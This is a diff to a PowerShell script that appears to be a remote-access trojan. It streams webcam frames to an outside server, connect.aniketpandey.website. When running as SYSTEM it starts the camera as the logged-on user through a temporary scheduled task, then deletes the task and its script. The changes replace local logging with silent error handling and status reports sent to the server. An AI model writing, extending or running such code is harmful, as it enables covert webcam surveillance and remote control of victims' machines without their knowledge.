@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.1"
+$Version = "3.0.2"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -332,16 +332,13 @@ function Send-CameraFrame {
         $wc.Headers.Add("User-Agent", "Mozilla/5.0")
         $wc.UploadData("$cfHost/camera_frame?id=$clientId", "POST", $FrameData) | Out-Null
         $wc.Dispose()
-    } catch {
-        Write-Log "Camera frame send failed: $($_.Exception.Message)" "WARN"
-    }
+    } catch { }  # Silent drop, don't crash runspace
 }
 
 function Start-CameraStream {
     param([int]$Quality = 50)
     
-    Write-Log "Camera stream started" "INFO"
-    Send-Stream-To-Server -Body "[*] Camera stream started`n"
+    try {
 
     # Find logged-on user (needed for SYSTEM account to access camera)
     $loggedOnUser = $null
@@ -356,7 +353,6 @@ function Start-CameraStream {
 
     if ($isSystem -and $loggedOnUser) {
         # SYSTEM needs to launch camera as logged-in user via scheduled task
-        Write-Log "Launching camera as $loggedOnUser" "INFO"
         
         $taskId = "CameraStream_$(Get-Random)"
         $cameraScript = @"
@@ -421,6 +417,15 @@ while (`$true) {
         Stop-ScheduledTask -TaskName $taskId -ErrorAction SilentlyContinue | Out-Null
         Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
         Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+        
+        # If the task died but we didn't type stopstream, notify server it crashed
+        if ($sharedState.CameraRunning) {
+            try {
+                $wc = New-Object System.Net.WebClient
+                $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+                $wc.UploadData("$cfHost/result?id=$clientId", "POST", [System.Text.Encoding]::UTF8.GetBytes("[!] SYSTEM camera task stopped unexpectedly`n")) | Out-Null
+            } catch {}
+        }
     }
     else {
         # Running as normal user - direct camera access
@@ -446,7 +451,6 @@ while (`$true) {
                     Send-CameraFrame -FrameData $frameBytes
                     $ms.SetLength(0)
                 } catch {
-                    Write-Log "Frame capture error: $($_.Exception.Message)" "WARN"
                     break
                 }
                 Start-Sleep -Milliseconds 100
@@ -456,13 +460,21 @@ while (`$true) {
             $ms.Dispose()
         }
         catch {
-            Send-Stream-To-Server -Body "[!] Camera access failed: $($_.Exception.Message)`n"
-            Write-Log "Camera init failed: $($_.Exception.Message)" "WARN"
+            # Silent fail in runspace, but log if logFile is available
+            if ($logFile) {
+                $msg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [WARN] Camera init failed: $($_.Exception.Message)"
+                Add-Content -Path $logFile -Value $msg -ErrorAction SilentlyContinue
+            }
+            try {
+                $wc = New-Object System.Net.WebClient
+                $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+                $wc.UploadData("$cfHost/result?id=$clientId", "POST", [System.Text.Encoding]::UTF8.GetBytes("[!] Camera access failed: $($_.Exception.Message)`n")) | Out-Null
+            } catch {}
         }
     }
-
-    Write-Log "Camera stream stopped" "INFO"
-    Send-Stream-To-Server -Body "[*] Camera stream stopped`n"
+    } finally {
+        if ($sharedState) { $sharedState.CameraRunning = $false }
+    }
 }
 
 function Stop-CameraStream {
@@ -1001,6 +1013,7 @@ function Connect-Cloudflare {
                         $rs.SessionStateProxy.SetVariable('cfHost', $cfHost)
                         $rs.SessionStateProxy.SetVariable('clientId', $clientId)
                         $rs.SessionStateProxy.SetVariable('sharedState', $script:sharedState)
+                        $rs.SessionStateProxy.SetVariable('logFile', $logFile)
                         $script:cameraRunspace = $rs
                         $ps = [powershell]::Create()
                         $ps.Runspace = $rs
